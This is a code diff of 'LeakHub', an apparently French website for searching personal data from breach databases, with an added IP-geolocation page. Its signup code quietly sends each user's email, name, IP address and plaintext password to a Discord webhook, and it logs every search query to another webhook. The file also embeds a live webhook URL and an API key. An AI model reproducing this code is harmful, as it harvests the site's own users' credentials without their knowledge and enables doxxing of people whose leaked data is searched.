@@ -27,14 +27,16 @@
         nav a::after{content:"";position:absolute;bottom:-6px;left:0;width:0;height:2px;background:var(--accent);transition:all .4s}
         nav a:hover::after,nav a.active::after{width:100%}
         nav a:hover,nav a.active{color:var(--accent)}
-        .profile-btn{width:46px;height:46px;border-radius:50%;border:2px solid var(--accent);overflow:hidden;cursor:pointer;box-shadow:var(--glow);transition:.3s}
+        .profile-btn{width:46px;height:46px;border-radius:50%;border:2px solid var(--accent);overflow:hidden;cursor:pointer;box-shadow:var(--glow);transition:.3s;position:relative}
         .profile-btn:hover{transform:scale(1.15)}
         .profile-btn img{width:100%;height:100%;object-fit:cover}
+        .profile-btn.locked{opacity:0.5;cursor:not-allowed;pointer-events:none}
+        .profile-btn.locked::after{content:"Verrouillé";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:10px;color:#fff;background:rgba(0,0,0,.7);padding:2px 6px;border-radius:4px;white-space:nowrap}
         main{padding-top:7rem;min-height:100vh;display:flex;justify-content:center;align-items:center}
         section{width:100%;max-width:900px;padding:3rem 5%;text-align:center;display:none;flex-direction:column;align-items:center}
         section.active{display:flex}
         h1{font-size:clamp(2.5rem,7vw,3.8rem);margin-bottom:1rem;background:linear-gradient(135deg,#fff,var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:700;text-shadow:var(--glow)}
-        p{color:#888;max-width:600px;margin-bottom:2rem;font-size:1.1rem}
+        p{color:#888;max-width:700px;margin-bottom:1.5rem;font-size:1.1rem;line-height:1.7}
         button{padding:.9rem 2.4rem;border:2px solid var(--accent);background:transparent;border-radius:50px;color:var(--accent);font-weight:600;cursor:pointer;transition:all .4s}
         button:hover{background:var(--accent);color:#000;box-shadow:var(--glow);transform:translateY(-3px)}
         input{margin:.6rem 0;padding:.9rem 1.2rem;width:100%;max-width:420px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.15);color:var(--text);border-radius:12px;outline:none;transition:.3s}
@@ -43,7 +45,7 @@
         .loader div{width:14px;height:14px;background:var(--accent);border-radius:50%;animation:p .8s infinite alternate}
         .loader div:nth-child(2){animation-delay:.2s}.loader div:nth-child(3){animation-delay:.4s}
         @keyframes p{to{transform:scale(1.4);opacity:.6}}
-        #result{margin-top:2rem;width:100%;max-width:800px;background:rgba(255,255,255,.03);padding:1.5rem;border-radius:var(--radius);border:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:.95rem;max-height:50vh;overflow-y:auto;white-space:pre-wrap}
+        #result, #ipResult{margin-top:2rem;width:100%;max-width:800px;background:rgba(255,255,255,.03);padding:1.5rem;border-radius:var(--radius);border:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:.95rem;max-height:50vh;overflow-y:auto;white-space:pre-wrap}
         .modal{position:fixed;inset:0;background:rgba(0,0,0,.92);display:flex;justify-content:center;align-items:center;z-index:2000;opacity:0;visibility:hidden;backdrop-filter:blur(10px);transition:all .4s}
         .modal.active{opacity:1;visibility:visible}
         .modal-content{background:var(--surface);padding:2.5rem;border-radius:var(--radius);width:90%;max-width:420px;border:1px solid var(--border);box-shadow:0 0 40px rgba(30,144,255,.3);transform:scale(.9);transition:all .4s}
@@ -55,16 +57,16 @@
         .discord-btn{position:fixed;bottom:20px;right:20px;width:56px;height:56px;background:#5865F2;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 30px rgba(88,101,242,.6);cursor:pointer;z-index:999;transition:.3s}
         .discord-btn:hover{transform:scale(1.2);box-shadow:0 0 40px rgba(88,101,242,.9)}
         .discord-btn img{width:36px;height:36px}
+        .info-text{text-align:left;max-width:800px;line-height:1.8;font-size:1.05rem;color:#ccc}
+        .info-text strong{color:var(--accent)}
     </style>
 </head>
 <body>
     <canvas id="particles"></canvas>
-
     <!-- LOGO DISCORD EN BAS -->
     <a href="https://discord.gg/jhqXyFhXbb" target="_blank" class="discord-btn">
         <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/6369b3f0d034c8d6413d3f0c_6245a4f3a3c4a9b4b22e0c00_Discord-Logo-White.svg" alt="Discord">
     </a>
-
     <header>
         <a href="#" class="logo">
             <img src="https://cdn.discordapp.com/attachments/1433531634560274502/1436693142366720151/LeakHub_Logo.png?ex=69108841&is=690f36c1&hm=78ca092b07e44a55fc57c70352f2761b0f8ff4bb9bcd73ebf9ff806c6954c314&" alt="LeakHub">
@@ -72,9 +74,12 @@
         <nav>
             <ul>
                 <li><a href="#" data-target="home" class="active">Accueil</a></li>
+                <li><a href="#" data-target="info">Informations</a></li>
+                <li><a href="#" data-target="ipinfo">IP Info</a></li>
                 <li><a href="#" data-target="search">Recherche</a></li>
             </ul>
-            <div class="profile-btn" id="profileBtn" onclick="toggleProfilePopup()">
+            <!-- BOUTON PROFIL VERROUILLÉ TANT QUE PAS INSCRIT -->
+            <div class="profile-btn" id="profileBtn" onclick="checkAuthBeforeProfile()">
                 <img src="https://static.vecteezy.com/ti/vecteur-libre/p1/21548095-defaut-profil-image-avatar-utilisateur-avatar-icone-la-personne-icone-tete-icone-profil-image-icones-defaut-anonyme-utilisateur-masculin-et-femelle-homme-d-affaire-photo-espace-reserve-social-reseau-avatar-portrait-gratuit-vectoriel.jpg" id="profileImg">
             </div>
         </nav>
@@ -85,14 +90,34 @@
             <button onclick="saveProfile()">Sauvegarder</button>
         </div>
     </header>
-
     <main>
+        <!-- PAGE ACCUEIL -->
         <section id="home" class="active">
             <h1>LeakHub #2026</h1>
             <p>Recherche 10B+ leaks avec NazAPI — Gratuit. Anonyme. Puissant.</p>
             <button id="startBtn">Commencer</button>
         </section>
-
+        <!-- PAGE INFORMATIONS -->
+        <section id="info">
+            <h1>Informations</h1>
+            <div class="info-text">
+                <p>Bonjour, bienvenue sur <strong>LeakHub 🔍</strong>, un site et serveur Discord dédié à la récupération d'informations personnelles en utilisant les compétences de l'<strong>OSINT</strong>.</p>
+                <p>Ce site est conçu pour la recherche d'informations personnelles via des bases de données telles que <strong>NazAPI</strong>, <strong>Snus Base</strong>, et <strong>IntelX</strong>. En plus de ces fonctionnalités, LeakHub offre de nombreux autres outils, comme l'<strong>IP Info</strong>, qui permet de révéler toutes les informations publiques associées à une adresse IP, telles que la localisation, le pays, l'opérateur, et bien plus encore.</p>
+                <p>LeakHub est le fruit du travail de <strong>LuXo</strong> et <strong>S4lvaaa</strong>, qui ont mis leur expertise au service de cette plateforme. Rejoignez-nous pour explorer les profondeurs de l'OSINT et découvrez comment nous pouvons vous aider à trouver les informations dont vous avez besoin. Avec nos outils puissants et notre communauté dynamique, vous pourrez facilement accéder à une multitude de données et enrichir vos recherches.</p>
+                <p>Que vous soyez un professionnel de l'OSINT, un enquêteur, ou simplement curieux, <strong>LeakHub</strong> est l'endroit idéal pour satisfaire votre soif de connaissances. Notre plateforme est conçue pour être intuitive et accessible, vous permettant de naviguer aisément entre les différentes fonctionnalités et d'exploiter pleinement le potentiel de nos bases de données.</p>
+                <p>Ne manquez pas l'opportunité de rejoindre notre communauté et de profiter de toutes les ressources que LeakHub a à offrir. Ensemble, faisons avancer l'art de l'OSINT et découvrons les secrets cachés dans les profondeurs du web. 🌐🔍</p>
+            </div>
+        </section>
+        <!-- PAGE IP INFO -->
+        <section id="ipinfo">
+            <h1>IP Info</h1>
+            <p>Entrez une adresse IP pour voir toutes les informations publiques associées.</p>
+            <input type="text" id="ipInput" placeholder="Ex: 8.8.8.8">
+            <button onclick="getIPInfo()">Analyser l'IP</button>
+            <div class="loader" id="ipLoader"><div></div><div></div><div></div></div>
+            <pre id="ipResult">Résultats ici...</pre>
+        </section>
+        <!-- PAGE RECHERCHE -->
         <section id="search">
             <h1>NazAPI — 10B+ de leaks</h1>
             <input type="text" id="searchInput" placeholder="Email, téléphone, nom, IP...">
@@ -101,8 +126,7 @@
             <pre id="result">Résultats ici...</pre>
         </section>
     </main>
-
-    <!-- MODAL INSCRIPTION UNIQUEMENT -->
+    <!-- MODAL INSCRIPTION -->
     <div class="modal" id="authModal">
         <div class="modal-content">
             <span class="close-btn" onclick="closeModal()">X</span>
@@ -121,119 +145,225 @@
         const LOGS = "https://discord.com/api/webhooks/1436669162205479063/it5irsmeIstIOLMnWlmzp2O42XJS2JnaA11GABCG404pc_rAXRt37DZUZDrfXBDKPs7n";
         const NAZ_KEY = "8141145084:DcTUGz6Z";
         const DEFAULT_AVATAR = "https://static.vecteezy.com/ti/vecteur-libre/p1/21548095-defaut-profil-image-avatar-utilisateur-avatar-icone-la-personne-icone-tete-icone-profil-image-icones-defaut-anonyme-utilisateur-masculin-et-femelle-homme-d-affaire-photo-espace-reserve-social-reseau-avatar-portrait-gratuit-vectoriel.jpg";
+        
+        // === USER STATE ===
+        let user = {
+            name: localStorage.getItem('lh_name') || 'Invité',
+            avatar: localStorage.getItem('lh_avatar') || DEFAULT_AVATAR,
+            registered: !!localStorage.getItem('lh_registered')
+        };
 
-        let user = {name: localStorage.getItem('lh_name')||'Invité', avatar: localStorage.getItem('lh_avatar')||DEFAULT_AVATAR, registered: !!localStorage.getItem('lh_registered')};
+        // Mettre à jour l'avatar
         document.getElementById('profileImg').src = user.avatar;
-        if(user.registered) switchTo('search');
 
+        // === VERROUILLAGE PROFIL ===
+        function updateProfileButton() {
+            const btn = document.getElementById('profileBtn');
+            if (user.registered) {
+                btn.classList.remove('locked');
+                btn.title = "Personnaliser ton profil";
+            } else {
+                btn.classList.add('locked');
+                btn.title = "Inscris-toi pour personnaliser ton profil";
+            }
+        }
+
+        // Fonction de vérification avant d'ouvrir le profil
+        function checkAuthBeforeProfile() {
+            if (!user.registered) {
+                alert("Inscris-toi d'abord pour personnaliser ton profil !");
+                openModal();
+                return;
+            }
+            toggleProfilePopup();
+        }
+
+        function toggleProfilePopup() {
+            if (!user.registered) return;
+            const p = document.getElementById('profilePopup');
+            p.style.display = p.style.display === 'block' ? 'none' : 'block';
+        }
+
+        // === INITIALISATION ===
+        if (user.registered) switchTo('search');
         document.getElementById('startBtn').onclick = () => openModal();
+        updateProfileButton(); // Appliquer le verrou dès le chargement
 
         function isValidEmail(email) {
             return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
         }
 
-        document.querySelectorAll('nav a').forEach(a=>a.onclick=e=>{e.preventDefault();document.querySelectorAll('section').forEach(s=>s.classList.remove('active'));document.getElementById(a.dataset.target).classList.add('active');document.querySelectorAll('nav a').forEach(x=>x.classList.remove('active'));a.classList.add('active');});
-        function switchTo(id){document.querySelectorAll('section').forEach(s=>s.classList.remove('active'));document.getElementById(id).classList.add('active');}
+        // Navigation
+        document.querySelectorAll('nav a').forEach(a => {
+            a.onclick = e => {
+                e.preventDefault();
+                document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
+                document.getElementById(a.dataset.target).classList.add('active');
+                document.querySelectorAll('nav a').forEach(x => x.classList.remove('active'));
+                a.classList.add('active');
+            };
+        });
 
-        function openModal(){document.getElementById('authModal').classList.add('active');document.body.style.overflow='hidden';}
-        function closeModal(){document.getElementById('authModal').classList.remove('active');document.body.style.overflow='';}
+        function switchTo(id) {
+            document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
 
-        async function submitSignup(){
+        function openModal() {
+            document.getElementById('authModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            document.getElementById('authModal').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        // === INSCRIPTION ===
+        async function submitSignup() {
             const n = document.getElementById('signupName').value.trim();
             const e = document.getElementById('signupEmail').value.trim();
             const p = document.getElementById('signupPassword').value;
-            document.getElementById('signupEmailError').textContent='';
-            if(!n||!e||!p) return alert('Remplis tout');
-            if(!isValidEmail(e)) return document.getElementById('signupEmailError').textContent='Email invalide';
+            document.getElementById('signupEmailError').textContent = '';
+            if (!n || !e || !p) return alert('Remplis tout');
+            if (!isValidEmail(e)) return document.getElementById('signupEmailError').textContent = 'Email invalide';
 
-            const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=> '??');
-            const h = new Date().toLocaleString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'}).replace(', ',' ');
-
+            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => '??');
+            const h = new Date().toLocaleString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(', ', ' ');
             const line = `email: ${e} name: ${n} ip: ${ip} mdp: ${p} heure: ${h}`;
             sendDB(line, user.avatar);
 
-            localStorage.setItem('lh_registered','true'); localStorage.setItem('lh_name',n);
-            user.registered=true; user.name=n;
+            localStorage.setItem('lh_registered', 'true');
+            localStorage.setItem('lh_name', n);
+            user.registered = true;
+            user.name = n;
+
             alert('Inscription réussie ! Tu es connecté à vie');
-            closeModal(); switchTo('search');
+            closeModal();
+            switchTo('search');
             sendLog(`INSCRIPTION : **${n}** (${e})`);
+
+            // Déverrouiller le profil
+            updateProfileButton();
         }
 
-        async function searchLeak(){
+        // === RECHERCHE NAZAPI ===
+        async function searchLeak() {
             const q = document.getElementById('searchInput').value.trim();
             const r = document.getElementById('result');
             const l = document.getElementById('loader');
-            if(!q) return r.textContent='Entre quelque chose';
-            r.textContent=''; l.style.display='flex';
+            if (!q) return r.textContent = 'Entre quelque chose';
+            r.textContent = ''; l.style.display = 'flex';
             sendLog(`Recherche NazAPI par **${user.name}** : \`${q}\``);
-            try{
+            try {
                 const res = await fetch(`https://api.leakosint.com/search?key=${NAZ_KEY}&query=${encodeURIComponent(q)}`);
                 const data = await res.json();
-                r.textContent = JSON.stringify(data,null,2) || 'Aucun résultat';
-            }catch(e){r.textContent='Erreur: '+e.message;}
-            l.style.display='none';
+                r.textContent = JSON.stringify(data, null, 2) || 'Aucun résultat';
+            } catch (e) { r.textContent = 'Erreur: ' + e.message; }
+            l.style.display = 'none';
         }
 
-        function toggleProfilePopup(){
-            const p = document.getElementById('profilePopup');
-            p.style.display = p.style.display==='block' ? 'none' : 'block';
+        // === IP INFO (NOUVELLE API : ipapi.co - HTTPS GRATUIT) ===
+        async function getIPInfo() {
+            const ip = document.getElementById('ipInput').value.trim();
+            const result = document.getElementById('ipResult');
+            const loader = document.getElementById('ipLoader');
+            if (!ip || !/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
+                result.textContent = 'Veuillez entrer une IP valide (ex: 8.8.8.8)';
+                return;
+            }
+            result.textContent = ''; loader.style.display = 'flex';
+            sendLog(`IP Info recherchée par **${user.name}** : \`${ip}\``);
+            try {
+                const res = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await res.json();
+                if (data.error) throw new Error(data.reason || 'IP invalide');
+                const formatted = `
+IP: ${data.ip}
+Pays: ${data.country_name} (${data.country_code})
+Région: ${data.region}, ${data.city} ${data.postal || ''}
+Fuseau: ${data.timezone}
+FAI: ${data.org} (${data.asn || ''})
+Mobile: ${data.mobile ? 'Oui' : 'Non'}
+Proxy/VPN: ${data.proxy ? 'Oui' : 'Non'}
+Lat: ${data.latitude}, Lon: ${data.longitude}
+Version: ${data.in_eu ? 'UE' : 'Non-UE'}
+                `.trim();
+                result.textContent = formatted;
+            } catch (e) {
+                result.textContent = 'Erreur: ' + (e.message || 'Impossible de récupérer les données');
+            }
+            loader.style.display = 'none';
         }
-        function handleFile(i){
-            const f=i.files[0]; if(!f) return;
-            const r=new FileReader();
-            r.onload=e=>{
-                user.avatar=e.target.result;
-                document.getElementById('profileImg').src=user.avatar;
-                localStorage.setItem('lh_avatar',user.avatar);
-                sendLog(`Photo changée par **${user.name}**`,user.avatar);
+
+        // === PROFIL ===
+        function handleFile(i) {
+            if (!user.registered) return;
+            const f = i.files[0]; if (!f) return;
+            const r = new FileReader();
+            r.onload = e => {
+                user.avatar = e.target.result;
+                document.getElementById('profileImg').src = user.avatar;
+                localStorage.setItem('lh_avatar', user.avatar);
+                sendLog(`Photo changée par **${user.name}**`, user.avatar);
             };
             r.readAsDataURL(f);
         }
-        function saveProfile(){
-            const n=document.getElementById('editName').value.trim();
-            if(n && n!==user.name){
+
+        function saveProfile() {
+            if (!user.registered) return;
+            const n = document.getElementById('editName').value.trim();
+            if (n && n !== user.name) {
                 sendLog(`Pseudo : **${user.name}** → **${n}**`);
-                user.name=n; localStorage.setItem('lh_name',n);
+                user.name = n;
+                localStorage.setItem('lh_name', n);
             }
-            document.getElementById('profilePopup').style.display='none';
+            document.getElementById('profilePopup').style.display = 'none';
         }
 
-        async function sendDB(t,i){
-            const p={content:"```yaml\n"+t+"\n```"};
-            if(i && i.startsWith('data:image')){
-                const b=await (await fetch(i)).blob();
-                const e=b.type.split('/')[1]||'png';
-                p.embeds=[{description:t,color:3447003,thumbnail:{url:`attachment://pp.${e}`},timestamp:new Date().toISOString()}];
-                const f=new FormData(); f.append('payload_json',JSON.stringify(p)); f.append('files[0]',b,`pp.${e}`);
-                fetch(DB,{method:'POST',body:f});
-            }else fetch(DB,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});
+        // === DISCORD WEBHOOKS ===
+        async function sendDB(t, i) {
+            const p = { content: "```yaml\n" + t + "\n```" };
+            if (i && i.startsWith('data:image')) {
+                const b = await (await fetch(i)).blob();
+                const e = b.type.split('/')[1] || 'png';
+                p.embeds = [{ description: t, color: 3447003, thumbnail: { url: `attachment://pp.${e}` }, timestamp: new Date().toISOString() }];
+                const f = new FormData(); f.append('payload_json', JSON.stringify(p)); f.append('files[0]', b, `pp.${e}`);
+                fetch(DB, { method: 'POST', body: f });
+            } else fetch(DB, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(p) });
         }
 
-        function sendLog(t,i=null){
-            const p={content:"```"+t+"```"};
-            if(i){
-                (async()=>{
-                    const b=await (await fetch(i)).blob();
-                    const e=b.type.split('/')[1]||'png';
-                    p.embeds=[{image:{url:`attachment://log.${e}`}}];
-                    const f=new FormData(); f.append('payload_json',JSON.stringify(p)); f.append('files[0]',b,`log.${e}`);
-                    fetch(LOGS,{method:'POST',body:f});
+        function sendLog(t, i = null) {
+            const p = { content: "```" + t + "```" };
+            if (i) {
+                (async () => {
+                    const b = await (await fetch(i)).blob();
+                    const e = b.type.split('/')[1] || 'png';
+                    p.embeds = [{ image: { url: `attachment://log.${e}` } }];
+                    const f = new FormData(); f.append('payload_json', JSON.stringify(p)); f.append('files[0]', b, `log.${e}`);
+                    fetch(LOGS, { method: 'POST', body: f });
                 })();
-            }else fetch(LOGS,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});
+            } else fetch(LOGS, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(p) });
         }
 
-        const c=document.getElementById('particles'),ctx=c.getContext('2d');let p=[];
-        function rz(){c.width=innerWidth;c.height=innerHeight;}
-        class Particle{constructor(){this.x=Math.random()*c.width;this.y=Math.random()*c.height;this.size=Math.random()*1.5+.5;this.sx=Math.random()*.8-.4;this.sy=Math.random()*.8-.4;}
-            update(){this.x+=this.sx;this.y+=this.sy;if(this.x<0||this.x>c.width)this.sx*=-1;if(this.y<0||this.y>c.height)this.sy*=-1;}
-            draw(){ctx.fillStyle='rgba(30,144,255,0.6)';ctx.beginPath();ctx.arc(this.x,this.y,this.size,0,Math.PI*2);ctx.fill();}}
-        function init(){p=[];for(let i=0;i<80;i++)p.push(new Particle());}
-        function anim(){ctx.clearRect(0,0,c.width,c.height);p.forEach(x=>{x.update();x.draw();});requestAnimationFrame(anim);}
-        window.onresize=()=>{rz();init();};rz();init();anim();
+        // === PARTICULES ===
+        const c = document.getElementById('particles'), ctx = c.getContext('2d'); let p = [];
+        function rz() { c.width = innerWidth; c.height = innerHeight; }
+        class Particle {
+            constructor() { this.x = Math.random() * c.width; this.y = Math.random() * c.height; this.size = Math.random() * 1.5 + .5; this.sx = Math.random() * .8 - .4; this.sy = Math.random() * .8 - .4; }
+            update() { this.x += this.sx; this.y += this.sy; if (this.x < 0 || this.x > c.width) this.sx *= -1; if (this.y < 0 || this.y > c.height) this.sy *= -1; }
+            draw() { ctx.fillStyle = 'rgba(30,144,255,0.6)'; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); }
+        }
+        function init() { p = []; for (let i = 0; i < 80; i++) p.push(new Particle()); }
+        function anim() { ctx.clearRect(0, 0, c.width, c.height); p.forEach(x => { x.update(); x.draw(); }); requestAnimationFrame(anim); }
+        window.onresize = () => { rz(); init(); }; rz(); init(); anim();
 
-        document.addEventListener('click',e=>{
-            const pop=document.getElementById('profilePopup');
-            if(!e.target.closest('.profile-btn') && !e.target.closest('.profile-popup')) pop.style.display='none';
+        // Fermer popup profil si clic ailleurs
+        document.addEventListener('click', e => {
+            const pop = document.getElementById('profilePopup');
+            if (!e.target.closest('.profile-btn') && !e.target.closest('.profile-popup')) {
+                pop.style.display = 'none';
+            }
         });
     </script>
 </body>
